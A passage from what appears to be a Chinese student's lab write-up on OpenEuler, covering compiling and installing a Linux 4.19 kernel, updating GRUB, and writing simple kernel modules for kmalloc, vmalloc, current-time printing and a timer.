<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /boot/config-4.19.90-2003.4.0.0036.oe1.x86_64 /usr/src/kernels/kernel-4.19.90-2405.5.0</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/50-copy-config-file.png" alt="拷贝配置文件"></p>
<p>（2）执行依赖安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install ncurses-devel</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/51-install-dependencies.png" alt="安装依赖"></p>
<p>（3）对配置进行需要的更改：我没有进行改动，直接默认配置，然后选择Save，生成了一个.config文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/52-kernel-config1.png" alt="内核配置1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/53-kernel-config2.png" alt="内核配置2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/54-kernel-config3.png" alt="内核配置3"></p>
<p>5.内核编译及安装</p>
<p>（1）安装所需组件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install elfutils-libelf-devel</span><br><span class="line">yum install openssl-devel</span><br><span class="line">yum install bc</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/55-install-components1.png" alt="安装所需组件1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/56-install-components2.png" alt="安装所需组件2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/57-install-components3.png" alt="安装所需组件3"></p>
<p>（2）开始编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j4</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/58-start-compile.png" alt="开始编译"></p>
<p>①时间很长，大约3~4小时，需要耐心等待。</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/59-compiling-progress.png" alt="编译进行中"></p>
<p>②编译完成</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/60-compile-complete.png" alt="编译完成"></p>
<p>（3）安装模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make modules_install</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/61-install-modules1.png" alt="安装模块1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/62-install-modules2.png" alt="安装模块2"></p>
<p>（4）安装内核</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/63-install-kernel.png" alt="安装内核"></p>
<p>（5）在&#x2F;boot目录下查看新安装的内核</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/64-check-new-kernel.png" alt="查看新内核"></p>
<p>6.更新引导</p>
<p>（1）下面的命令会根据&#x2F;boot&#x2F;目录下的内核文件自动更新启动引导文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/65-update-grub.png" alt="更新引导"></p>
<p>（2）重启，选择第二个，这是我们新安装的内核</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/66-reboot-select-kernel.jpg" alt="重启选择内核"></p>
<p>7.修改默认启动内核</p>
<p>（1）查看当前系统所有可用内核</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /boot/grub2/grub.cfg |grep <span class="string">&quot;menuentry &quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/67-check-available-kernels.png" alt="查看可用内核"></p>
<p>（2）查看当前默认启动内核</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub2-editenv list</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/68-check-default-kernel.png" alt="查看默认内核"></p>
<p>（3）修改默认启动内核，输入后再次查看内核版本，发现已经更新为新内核，原内核为4.19.90-2003，新内核为4.19.90</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub2-set-default 4.19.90</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/69-modify-default-kernel.png" alt="修改默认内核"></p>
<p>（4）执行uname -a指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/70-check-kernel-version.png" alt="查看内核版本"></p>
<p>至此，实验步骤完成。</p>
<h4 id="内核模块编程"><a href="#内核模块编程" class="headerlink" title="内核模块编程"></a>内核模块编程</h4><p>1.尝试先编写hello world，先编辑c文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/71-create-hello-world-c.png" alt="编写hello world c文件"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/72-hello-c-content.png" alt="hello.c文件内容"></p>
<p>2.此时还需要一个Makefile文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/73-create-makefile.png" alt="创建Makefile"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/74-makefile-content.png" alt="Makefile文件内容"></p>
<p>3.准备运行，运行成功</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/75-compile-and-run.png" alt="编译运行"></p>
<p>4.查看编译后文件列表</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/76-check-compiled-files.png" alt="查看编译文件"></p>
<p>5.执行相关命令。</p>
<p>①加载内核模块：insmod</p>
<p>②查看打印信息：dmesg | tail -n 行数</p>
<p>③查看内核模块：lsmod</p>
<p>④卸载内核模块：rmmod</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/77-kernel-module-operations1.png" alt="内核模块操作1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/78-kernel-module-operations2.png" alt="内核模块操作2"></p>
<p>实验完成。</p>
<h4 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h4><p>1.使用kmalloc分配1KB，8KB的内存，并打印指针地址</p>
<p>（1）创建kmalloc.c和Makefile文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/79-create-kmalloc-files.png" alt="创建kmalloc文件"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *kmallocmem1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *kmallocmem2;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mem_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Start kmalloc!\n&quot;</span>);</span><br><span class="line">    kmallocmem1 = (<span class="type">unsigned</span> <span class="type">char</span>*)kmalloc(<span class="number">1024</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (kmallocmem1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;kmallocmem1 addr = %lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)kmallocmem1);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printk(<span class="string">&quot;Failed to allocate kmallocmem1!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    kmallocmem2 = (<span class="type">unsigned</span> <span class="type">char</span> *)kmalloc(<span class="number">8192</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (kmallocmem2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;kmallocmem2 addr = %lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)kmallocmem2);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printk(<span class="string">&quot;Failed to allocate kmallocmem2!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mem_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    kfree(kmallocmem1);</span><br><span class="line">    kfree(kmallocmem2);</span><br><span class="line">    printk(<span class="string">&quot;Exit kmalloc!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mem_module_init);</span><br><span class="line">module_exit(mem_module_exit);</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m := kmalloc.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KERNELDIR ?=/usr/src/kernels/kernel-4.19.90-2405.5.0</span><br><span class="line">    PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    -rm *.mod.c *.o *.order *.symvers *.ko</span><br></pre></td></tr></table></figure>

<p>（2）编译、加载模块。依次输入以下命令进行实验。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/80-kmalloc-compile1.png" alt="kmalloc编译1"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod kmalloc.ko</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/81-kmalloc-compile2.png" alt="kmalloc编译2"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | <span class="built_in">tail</span> -n 3</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/82-kmalloc-compile3.png" alt="kmalloc编译3"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rmmod kmalloc</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/83-kmalloc-compile4.png" alt="kmalloc编译4"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | <span class="built_in">tail</span> -n 4</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/84-kmalloc-compile5.png" alt="kmalloc编译5"></p>
<p>（3）查看内存布局</p>
<p>打开&#x2F;usr&#x2F;src&#x2F;kernels&#x2F;kernel-4.19.90-2405.5.0&#x2F;Documentation&#x2F;x86&#x2F;x86_64&#x2F; mm.txt文件。</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/85-memory-layout1.png" alt="内存布局1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/86-memory-layout2.png" alt="内存布局2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/87-memory-layout3.png" alt="内存布局3"></p>
<p>（4）结果分析：由运行结果可知，kmalloc分配的内存地址，位于内核空间。</p>
<p>2.使用vmalloc分别分配8KB、1MB、64MB 的内存，打印指针地址</p>
<p>（1）创建vmalloc.c和Makefile文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/88-create-vmalloc-files.png" alt="创建vmalloc文件"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *vmallocmem1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *vmallocmem2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *vmallocmem3;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mem_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Start vmalloc!\n&quot;</span>);</span><br><span class="line">    vmallocmem1 = (<span class="type">unsigned</span> <span class="type">char</span>*)vmalloc(<span class="number">8192</span>);</span><br><span class="line">    <span class="keyword">if</span> (vmallocmem1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        printk(<span class="string">&quot;vmallocmem1 addr = %lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)vmallocmem1);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printk(<span class="string">&quot;Failed to allocate vmallocmem1!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vmallocmem2 = (<span class="type">unsigned</span> <span class="type">char</span>*)vmalloc(<span class="number">1048576</span>);</span><br><span class="line">    <span class="keyword">if</span> (vmallocmem2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        printk(<span class="string">&quot;vmallocmem2 addr = %lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)vmallocmem2);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printk(<span class="string">&quot;Failed to allocate vmallocmem2!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    vmallocmem3 = (<span class="type">unsigned</span> <span class="type">char</span>*)vmalloc(<span class="number">67108864</span>);</span><br><span class="line">    <span class="keyword">if</span> (vmallocmem3 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        printk(<span class="string">&quot;vmallocmem3 addr = %lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)vmallocmem3);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printk(<span class="string">&quot;Failed to allocate vmallocmem3!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mem_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    vfree(vmallocmem1);</span><br><span class="line">    vfree(vmallocmem2);</span><br><span class="line">    vfree(vmallocmem3);</span><br><span class="line">    printk(<span class="string">&quot;Exit vmalloc!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mem_module_init);</span><br><span class="line">module_exit(mem_module_exit);</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m := vmalloc.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KERNELDIR ?= /usr/src/kernels/kernel-4.19.90-2405.5.0</span><br><span class="line">    PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    -rm *.mod.c *.o *.order *.symvers *.ko</span><br></pre></td></tr></table></figure>

<p>（2）编译、加载模块。依次输入以下命令进行实验。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/89-vmalloc-compile1.png" alt="vmalloc编译1"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod vmalloc.ko</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/90-vmalloc-compile2.png" alt="vmalloc编译2"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | <span class="built_in">tail</span> -n 4</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/91-vmalloc-compile3.png" alt="vmalloc编译3"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rmmod vmalloc</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/92-vmalloc-compile4.png" alt="vmalloc编译4"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | <span class="built_in">tail</span> -n 5</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/93-vmalloc-compile5.png" alt="vmalloc编译5"></p>
<p>（3）查看内存布局</p>
<p>打开&#x2F;usr&#x2F;src&#x2F;kernels&#x2F;kernel-4.19.90-2405.5.0&#x2F;Documentation&#x2F;x86&#x2F;x86_64&#x2F; mm.txt文件。</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/94-vmalloc-memory-layout1.png" alt="vmalloc内存布局1"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/95-vmalloc-memory-layout2.png" alt="vmalloc内存布局2"></p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/96-vmalloc-memory-layout3.png" alt="vmalloc内存布局3"></p>
<p>（4）结果分析：由运行结果可知，vmalloc分配的内存地址，位于内核空间。</p>
<h4 id="内核时间管理"><a href="#内核时间管理" class="headerlink" title="内核时间管理"></a>内核时间管理</h4><p>1.调用内核时钟接口打印当前时间</p>
<p>（1）创建current_time.c和Makefile文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/97-create-time-management-files.png" alt="创建时间管理文件"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/rtc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtc_time</span> <span class="title">tm</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">currenttime_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> year, mon, day, hour, min, sec;</span><br><span class="line">    printk(<span class="string">&quot;Start current_time module...\n&quot;</span>);</span><br><span class="line">    do_gettimeofday(&amp;tv);</span><br><span class="line">    rtc_time_to_tm(tv.tv_sec, &amp;tm);</span><br><span class="line">    year = tm.tm_year + <span class="number">1900</span>;</span><br><span class="line">    mon = tm.tm_mon + <span class="number">1</span>;</span><br><span class="line">    day = tm.tm_mday;</span><br><span class="line">    hour = tm.tm_hour + <span class="number">8</span>;</span><br><span class="line">    min = tm.tm_min;</span><br><span class="line">    sec = tm.tm_sec;</span><br><span class="line">    printk(<span class="string">&quot;Current time: %d-%02d-%02d %02d:%02d:%02d\n&quot;</span>, year, mon, day, hour, min, sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">currenttime_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Exit current_time module...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(currenttime_init);</span><br><span class="line">module_exit(currenttime_exit);</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m := current_time.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KERNELDIR ?=/usr/src/kernels/kernel-4.19.90-2405.5.0</span><br><span class="line">    PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    -rm *.mod.c *.o *.order *.symvers *.ko</span><br></pre></td></tr></table></figure>

<p>（2）编译运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">insmod current_time.ko</span><br><span class="line">dmesg | <span class="built_in">tail</span> -n 2</span><br><span class="line">rmmod current_time</span><br><span class="line">dmesg | <span class="built_in">tail</span> -n 3</span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/98-time-management-compile-run.png" alt="时间管理编译运行"></p>
<p>（3）结果分析 ：成功在在屏幕上打印出格式化的时间、日期，并正确地加载和卸载。</p>
<p>2.编写timer，在特定时刻打印hello,world</p>
<p>（1）创建timer_example.c和Makefile文件</p>
<p><img src="/2025/05/25/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FOpenEuler%E5%AE%9E%E9%AA%8C/99-create-timer-files.png" alt="创建timer文件"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/timer.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> timer_list *timer)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello,world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">timer_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Start timer_example module...\n&quot;</span>);</span><br><span class="line">    timer.expires = jiffies + <span class="number">10</span> * HZ;</span><br><span class="line">    timer.function = print;</span><br><span class="line">    add_timer(&amp;timer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">timer_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Exit timer_example module...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(timer_init);</span><br><span class="line">module_exit(timer_exit);</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">obj-m := timer_example.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KERNELDIR ?=/usr/src/kernels/kernel-4.19.90-2405.5.0</span><br><span class="line">    PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    -rm *.mod.c *.o *.order *.symvers *.ko</span><br></pre></td></tr></table></figure>

<p>（2）编译运行</p>
